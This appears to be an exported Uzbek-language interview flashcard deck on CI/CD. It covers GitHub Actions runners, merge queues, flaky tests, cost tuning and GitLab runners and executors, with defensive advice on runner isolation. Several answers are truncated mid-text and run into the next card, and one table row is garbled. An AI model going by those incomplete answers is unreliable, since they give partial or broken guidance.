App.</li><li><b>Izolyatsiya:</b> runner group + repo allowlist; prod deploy uchun alohida scale set.</li><li><b>Cloud kirish:</b> node IAM roli emas — har job OIDC bilan; aks holda har job node rolini oladi.</li><li><b>Docker build:</b> <code>dind</code> (privileged — xavfli) o'rniga BuildKit rootless yoki Kaniko/Buildah; yoki alohida node pool.</li><li><b>Tezlik:</b> <code>minRunners: 0</code> arzon, lekin cold start (image pull 1-2 daqiqa) — image'ni kichik saqla, node'larda pre-pull, yoki ish vaqtida <code>minRunners: 2</code>.</li><li><b>Xarajat:</b> spot node pool, Karpenter.</li></ul><p><b>Monitoring:</b> queue time (job kutish), pod start time, runner xatolari; ARC listener metrikalari Prometheus'ga.</p><p><b>Tuzoqlar:</b></p><ul><li>Public repo'ga ulash — fork PR'lar cluster ichida kod bajaradi.</li><li>Privileged dind pod — container escape orqali node'ni egallash.</li><li>Runner pod'lari prod workload bilan bitta cluster/node'da.</li></ul><p><b>Senior nuqta:</b> CI runner'lar — yuqori xavfli workload (ishonchsiz kod bajaradi). Ularni alohida cluster yoki kamida alohida node pool, network policy va egress cheklovi bilan izolyatsiya qil.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33033	<p>Merge queue nima muammoni yechadi va CI'ni qanday moslash kerak?</p>	<p><b>Qisqa javob:</b> Merge queue &quot;semantik konflikt&quot; muammosini yechadi: ikki PR alohida yashil, lekin birga merge bo'lganda main buziladi. Queue har PR'ni main + oldingi navbatdagi PR'lar bilan birlashtirilgan vaqtinchalik branch'da tekshiradi va faqat yashil bo'lsa merge qiladi. CI'ni moslash uchun workflow <code>merge_group</code> event'ini qo'llab-quvvatlashi shart.</p><p><b>Muammo:</b></p><pre>main: f(a)<br>PR A: f(a) -&gt; f(a, b)   (imzo o'zgardi)       CI yashil<br>PR B: yangi joyda f(a) chaqiradi               CI yashil<br>merge A, keyin B -&gt; main kompilyatsiya bo'lmaydi</pre><p>&quot;Require branches to be up to date&quot; bilan yechish — har merge'dan keyin hamma PR rebase + CI qayta, katta jamoada navbat soatlab cho'ziladi.</p><p><b>Queue qanday ishlaydi:</b></p><pre>queue: [A] [B] [C]<br>  gh-readonly-queue/main/pr-A      = main + A         -&gt; CI<br>  gh-readonly-queue/main/pr-B      = main + A + B     -&gt; CI (parallel)<br>  A yashil -&gt; merge; B yashil -&gt; merge<br>  B qizil -&gt; B chiqariladi, C qayta (main + A + C)</pre><p><b>Amalda:</b></p><pre>on:<br>  pull_request:<br>  merge_group:            # bu bo'lmasa required check hech qachon kelmaydi<br>jobs:<br>  unit:<br>    runs-on: ubuntu-latest<br>    steps: [...]<br>  e2e:<br>    if: github.event_name == 'merge_group'    # og'ir testlar faqat queue'da<br>    runs-on: ubuntu-latest<br>    steps: [...]</pre><p>Ruleset: &quot;Require merge queue&quot; + required status checks (<code>unit</code>, <code>e2e</code>); build concurrency va grouping sozlamalari.</p><p><b>Tuzoqlar:</b></p><ul><li><code>merge_group</code> trigger yo'q — queue &quot;Expected — waiting for status&quot; holatida osilib qoladi.</li><li>Required check faqat <code>merge_group</code> da ishlasa, PR'da ham u &quot;kutilmoqda&quot; bo'ladi — PR uchun skip qiluvchi yengil variant kerak.</li><li>Flaky test butun navbatni qayta-qayta qayta qurdiradi — quarantine va flaky monitoring.</li><li><code>paths</code> filter bilan required check'lar — queue branch'ida mos kelmasligi mumkin.</li></ul><p><b>Senior nuqta:</b> Queue CI vaqtini PR va merge bosqichlariga bo'lishga imkon beradi: tez check'lar PR'da (feedback), qimmat e2e faqat queue'da (kafolat). Navbat uzunligi va kutish vaqtini kuzat.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33034	<p>Artifact attestation / SLSA provenance Actions'da qanday qilinadi?</p>	<p><b>Qisqa javob:</b> Artifact attestation — build natijasi (image, binary) uchun kriptografik imzolangan provenance: qaysi repo, qaysi commit, qaysi workflow, qaysi runner'da build qilingani. Actions'da <code>actions/attest-build-provenance</code> buni Sigstore orqali OIDC identifikatori bilan imzolaydi (SLSA provenance formatida). Interview Drill::CI/CD::I8 GitHub Actions	idrill-33035	<p>Flaky testlar CI'ni buzayotgan bo'lsa nima qilasiz?</p>	<p><b>Qisqa javob:</b> Flaky test bilan ishlash tartibi: aniqlash (bir commit'da goh o'tadi, goh yiqiladi), cheklash (quarantine — pipeline'ni bloklamaydi, lekin egasi va muddati bor), ildiz sababini topish va tuzatish, takrorlanmasligini oldini olish (hermetic testlar). Retry bilan yashirish — yechim emas.</p><p><b>Nega muhim:</b> Flaky testlar ishonchni yo'qotadi: jamoa qizil CI'ni &quot;yana flaky&quot; deb e'tiborsiz qoldiradi, haqiqiy bug ham o'tib ketadi. Re-run'lar daqiqa va vaqt yeydi.</p><p><b>Jarayon:</b></p><pre>1. Detect   -&gt; JUnit XML + test analytics: bir SHA'da pass va fail<br>2. Contain  -&gt; quarantine ro'yxati (skip yoki non-blocking), ticket + owner + muddat<br>3. Reproduce-&gt; ko'p marta, shuffle va race bilan<br>4. Fix      -&gt; ildiz sababi<br>5. Prevent  -&gt; hermetic test, fake clock, lint</pre><p><b>Amalda (Go):</b></p><pre>go test -run TestOrderFlow -count=200 -race -shuffle=on ./orders/...<br>go test -count=1 -p 1 ./...      # parallellik muammosini ajratish</pre><p>Quarantine:</p><pre>func TestPaymentWebhook(t *testing.T) {<br>    if os.Getenv(&quot;RUN_QUARANTINED&quot;) == &quot;&quot; {<br>        t.Skip(&quot;flaky: OPS-412, @dilshod, 2026-10-20 gacha&quot;)<br>    }<br>}</pre><p>Tungi workflow quarantine testlarini alohida ishlatib, statistika yig'adi.</p><p><b>Odatiy ildiz sabablari:</b></p><p>| Sabab | Tuzatish | |---|---| | <code>time.Sleep</code>, <code>time.Now()</code> | fake clock, <code>Eventually</code> polling | | test tartibiga bog'liqlik, global state | <code>t.Cleanup</code>, izolyatsiya | | port to'qnashuvi | <code>:0</code> port, <code>httptest</code> | | tashqi servis/internet | testcontainers, mock server | | data race | <code>-race</code>, sinxronizatsiya | | map iteratsiya tartibi | sort qilib solishtirish |</p><p><b>Tuzoqlar:</b></p><ul><li>Avtomatik retry — flaky &quot;yashil&quot; bo'ladi, real race bug prod'ga chiqadi.</li><li>Quarantine muddatsiz — &quot;qabriston&quot;ga aylanadi, testlar hech qachon qaytmaydi.</li><li>Flaky'ni testni o'chirib &quot;tuzatish&quot; — qamrov yo'qoladi.</li></ul><p><b>Senior nuqta:</b> Flaky rate'ni jamoa metrikasi qil (masalan, &lt; 1% run). Ko'p flaky testlar ko'pincha prod kodidagi haqiqiy concurrency muammosining belgisi.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33036	<p>Actions xarajati va tezligini qanday optimallashtirasiz?</p>	<p><b>Qisqa javob:</b> Keraksiz run'larni kesish (<code>paths</code>, <code>concurrency: cancel-in-progress</code>), qolganlarini tezlashtirish (cache, parallel/sharding, critical path'ni qisqartirish), qimmat resurslarni cheklash (macOS, larger runner'lar), osilgan job'larni to'xtatish (<code>timeout-minutes</code>) va storage'ni tozalash (artifact retention).</p><p><b>Qayerdan pul va vaqt ketadi:</b></p><pre>docs o'zgarishi ham to'liq CI      -&gt; Linux<br>osilgan job 6 soat                 -&gt; timeout-minutes<br>90 kunlik artifact'lar             -&gt; retention-days: 7</pre><p><b>Amalda:</b></p><pre>on:<br>  pull_request:<br>    paths-ignore: ['docs/**', '**.md']<br>concurrency:<br>  group: ci-${{ github.event.pull_request.number || github.ref }}<br>  cancel-in-progress: true<br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    timeout-minutes: 15<br>    strategy:<br>      matrix: {shard: [1, 2, 3, 4]}<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-go@v5<br>        with: {go-version-file: go.mod, cache: true}<br>      - run: go test $(go list ./... | awk &quot;NR % 4 == ${{ matrix.shard }} - 1&quot;)</pre><p>Docker: <code>cache-from/to: type=gha</code>, multi-stage, kichik context (<code>.dockerignore</code>).</p><p><b>O'lchash:</b></p><ul><li>Billing -&gt; Interview Drill::CI/CD::I8 GitHub Actions	idrill-33037	<p>Ko'p repo'li organizatsiyada CI standartini qanday boshqarasiz?</p>	<p><b>Qisqa javob:</b> Markazlashtirilgan, versiyalangan reusable workflow'lar (masalan <code>org/platform-workflows</code> repo'da <code>go-ci.yml@v3</code>), Rulesets orqali majburiy check'lar va required workflow'lar (security scan), aniq versiyalash va deprecation siyosati, qaysi repo qaysi versiyada ekanini ko'rsatuvchi inventar va ochiq exception jarayoni. Interview Drill::CI/CD::I8 GitHub Actions	idrill-34099	<p>GitHub Actions workflow ostida qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> Event (push, PR, cron) sodir bo'lganda GitHub repo'dagi <code>.github/workflows/*.yml</code> fayllarni tekshiradi, mos workflow'lar uchun run yaratadi. Har job navbatga qo'yiladi va bo'sh runner (toza VM yoki konteyner) uni oladi; runner step'larni ketma-ket bajaradi, loglarni GitHub'ga oqim bilan yuboradi va natijani (success/failure) qaytaradi.</p><p><b>Ichkarida nima bo'ladi:</b></p><pre>git push<br>  -&gt; GitHub: event &quot;push&quot; -&gt; mos workflow'lar topildi<br>  -&gt; run yaratildi, job'lar DAG bo'yicha navbatga<br>  -&gt; runner (ubuntu-latest VM) job'ni oldi:<br>       1. toza muhit, GITHUB_TOKEN beriladi<br>       2. action'lar yuklab olinadi (uses:)<br>       3. step'lar ketma-ket: checkout -&gt; setup -&gt; test<br>       4. log'lar real vaqtda UI'ga, secret'lar *** bilan<br>  -&gt; job tugadi -&gt; VM o'chiriladi<br>  -&gt; keyingi job (needs:) boshqa toza VM'da</pre><p><b>Amalda:</b></p><pre>name: CI<br>on: push<br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4      # kodni runner'ga yuklab olish<br>      - uses: actions/setup-node@v4<br>        with: {node-version: 22, cache: npm}<br>      - run: npm ci &amp;&amp; npm test        # shell buyruq</pre><p>Kuzatish:</p><pre>gh run list --limit 5<br>gh run watch                 # joriy run'ni jonli kuzatish<br>gh run view &lt;id&gt; --log-failed</pre><p><b>Asosiy qoidalar:</b></p><ul><li>Har job — alohida runner, toza muhit: oldingi job fayllari yo'q (kerak bo'lsa artifact/cache).</li><li>Job'lar default parallel, <code>needs:</code> bilan ketma-ket.</li><li>Step'lar bitta runner'da, umumiy fayl tizimi va workspace.</li><li><code>uses:</code> — tayyor action, <code>run:</code> — shell buyruq.</li><li>Secret'lar env sifatida beriladi, logda yashiriladi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Bir job'da yaratilgan faylni boshqa job'da kutish.</li><li><code>actions/checkout</code> ni unutish — runner'da kod yo'q.</li><li>Lokal muhitda ishlaydi, CI'da yo'q — runner'da boshqa versiyalar; Murakkab mantiqni YAML'dan skript/Makefile'ga chiqar — shunda uni lokal ham, CI'da ham bir xil ishlatasan.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I9 GitLab CI	idrill-32015	<p><code>.gitlab-ci.yml</code> da stage va job nima?</p>	<p><b>Qisqa javob:</b> <code>.gitlab-ci.yml</code> — repo ildizidagi pipeline ta'rifi. Job — bajariladigan eng kichik birlik (<code>script:</code> dagi buyruqlar, bitta runner'da). Stage — job'lar guruhi va tartibi: bir stage'dagi job'lar parallel ishlaydi, keyingi stage oldingisidagi hamma job muvaffaqiyatli tugaganda boshlanadi (<code>needs</code> ishlatilmasa).</p><p><b>Qanday ishlaydi:</b></p><pre>stages: build -&gt; test -&gt; deploy<br><br>build:   [build]              (parallel)<br>test:    [unit] [lint]        (build tugagach, parallel)<br>deploy:  [deploy-stg]         (test'dagi hammasi ok bo'lsa)</pre><p><b>Amalda:</b></p><pre>stages: [build, test, deploy]<br><br>build:<br>  stage: build<br>  image: golang:1.23<br>  script:<br>    - go build -o app ./cmd/app<br>  artifacts:<br>    paths: [app]<br><br>unit:<br>  stage: test<br>  image: golang:1.23<br>  script: go test ./...<br><br>lint:<br>  stage: test<br>  image: golangci/golangci-lint:v1.61<br>  script: golangci-lint run<br><br>deploy-stg:<br>  stage: deploy<br>  script: ./deploy.sh staging<br>  environment: staging</pre><p><b>Muhim:</b></p><ul><li><code>stages</code> yozilmasa default: <code>.pre, build, test, deploy, .post</code>. <code>stage</code> ko'rsatilmagan job — <code>test</code>.</li><li>Bir stage'dagi job fail bo'lsa — keyingi stage'lar ishlamaydi.</li><li>Har job alohida muhit (konteyner): fayllar job'lar orasida faqat artifact/cache orqali.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Fayl o'tadi deb o'ylash — <code>build</code> dagi <code>app</code> ni <code>deploy</code> da ishlatish uchun artifact kerak.</li><li>Stage'lar ko'p va ketma-ket — pipeline sekin; <code>needs</code> bilan DAG qil.</li><li>Job nomi <code>.</code> bilan boshlansa (<code>.template</code>) — u ishlamaydi (hidden job).</li></ul><p><b>Senior nuqta:</b> Stage — vizual va oddiy model, lekin katta pipeline'larda <code>needs</code> (DAG) critical path'ni sezilarli qisqartiradi. Stage'larni mantiqiy guruh sifatida qoldirib, bajarilish tartibini <code>needs</code> bilan boshqar.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32016	<p>GitLab Runner va executor nima?</p>	<p><b>Qisqa javob:</b> GitLab Runner — job'larni bajaradigan agent (alohida dastur). U GitLab'ga o'zi murojaat qilib (poll), navbatdagi job'ni oladi — shuning uchun runner'ga kiruvchi port ochish kerak emas. Executor — runner job'ni qayerda va qanday izolyatsiya bilan bajarishini belgilaydi: shell (to'g'ridan-to'g'ri host'da), docker (har job yangi konteyner), kubernetes (har job yangi pod) va boshqalar.</p><p><b>Qanday ishlaydi:</b></p><pre>GitLab (job navbati)<br>    ^  poll: &quot;menga job bormi?&quot; (har 3s)<br>    |<br>GitLab Runner (sening serveringda / K8s'da)<br>    |  executor<br>    v<br>docker run golang:1.23 -&gt; script -&gt; loglar GitLab'ga -&gt; konteyner o'chadi</pre><p><b>Runner turlari:</b> instance (shared, hamma loyihalar uchun), group, project. <code>tags:</code> bilan job kerakli runner'ga yo'naltiriladi.</p><p>| Executor | Izolyatsiya | Qachon | |---|---|---| | shell | yo'q, host'da | maxsus hardware, ishonchli muhit | | docker | har job konteyner | eng keng tarqalgan | | docker-autoscaler | cloud VM'larda autoscale | o'zgaruvchan yuk | | kubernetes | har job pod | K8s bor bo'lsa |</p><p><b>Amalda:</b></p><pre>gitlab-runner register \<br>  --url https://gitlab.example.com \<br>  --token glrt-xxxxx \<br>  --executor docker \<br>  --docker-image alpine:3.20<br>gitlab-runner list<br>gitlab-runner verify</pre><p>Yangi registratsiya: runner UI'da yaratilib, <code>glrt-</code> authentication token bilan (eski registration token deprecated).</p><pre>gpu-train:<br>  tags: [gpu, linux]<br>  script: python train.py</pre><p><b>Tuzoqlar:</b></p><ul><li>Shell executor bir nechta loyiha uchun — bir job boshqasining fayllari va credential'larini ko'radi.</li><li><code>tags</code> yo'q job, runner esa faqat tag'li job'larni oladi (<code>run_untagged=false</code>) — job &quot;pending&quot; da qotadi.</li><li><code>privileged = true</code> docker runner — konteynerdan host'ni egallash mumkin.</li></ul><p><b>Senior nuqta:</b> Production uchun ephemeral izolyatsiya (docker yoki kubernetes) va workload bo'yicha ajratilgan runner'lar (build / prod-deploy / GPU).
